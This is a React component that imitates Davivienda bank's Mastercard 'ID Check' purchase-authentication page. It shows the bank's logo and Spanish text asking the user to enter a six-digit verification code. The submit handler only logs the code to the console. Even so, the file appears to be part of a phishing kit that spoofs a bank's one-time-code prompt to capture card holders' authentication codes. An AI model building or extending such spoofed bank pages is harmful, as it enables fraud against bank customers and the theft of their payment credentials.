import React, { useState } from 'react';
import './DaviviendaIDCheck.css';
import logoDavivienda from '../../img/imgi_1_logo-davivienda2.webp';

const DaviviendaIDCheck = () => {
  const [otp, setOtp] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    console.log('Davivienda OTP Submitted:', otp);
  };

  return (
    <div className="davivienda-idcheck-container">
      <div className="davivienda-idcheck-card">
        {/* Header */}
        <div className="davivienda-idcheck-header">
          <div className="davivienda-logo">
            <img src={logoDavivienda} alt="Davivienda" className="davivienda-logo-img" />
          </div>
          <div className="idcheck-logo">
            <div className="mastercard-circles">
                <div style={{ width: '18px', height: '18px', backgroundColor: '#eb001b', borderRadius: '50%', marginRight: '-8px', opacity: 0.9 }}></div>
                <div style={{ width: '18px', height: '18px', backgroundColor: '#f79e1b', borderRadius: '50%', opacity: 0.9 }}></div>
            </div>
            <div className="idcheck-separator"></div>
            <div className="idcheck-text">ID Check</div>
          </div>
        </div>

        {/* Body Content */}
        <div className="davivienda-idcheck-body">
          <h2 className="davivienda-idcheck-title">Autenticación de compra</h2>
          
          <div className="davivienda-idcheck-description">
            <p>Davivienda le envió un código de confirmación para continuar con el proceso de compra. Por favor digítelo.</p>
            <p>Para recibir un nuevo código por favor haga click en <strong>REENVIAR CODIGO</strong></p>
          </div>

          <form onSubmit={handleSubmit} className="davivienda-idcheck-form">
            <label className="davivienda-idcheck-label">Código de verificación</label>
            <input 
              type="text" 
              className="davivienda-idcheck-input" 
              maxLength={6} 
              value={otp}
              onChange={(e) => setOtp(e.target.value.replace(/\D/g, ''))}
              placeholder=""
              autoFocus
            />
            
            <button type="submit" className="davivienda-idcheck-submit">
              ENVIAR
            </button>
          </form>

          {/* Links */}
          <div style={{ textAlign: 'center' }}>
            <button 
              className="davivienda-idcheck-resend"
              onClick={() => console.log('Reenviar código')}
            >
              REENVIAR CODIGO
            </button>
          </div>

          <button 
            className="davivienda-idcheck-help"
            onClick={() => console.log('Ayuda')}
          >
            ¿Necesita ayuda?
          </button>
        </div>
      </div>
    </div>
  );
};

export default DaviviendaIDCheck;
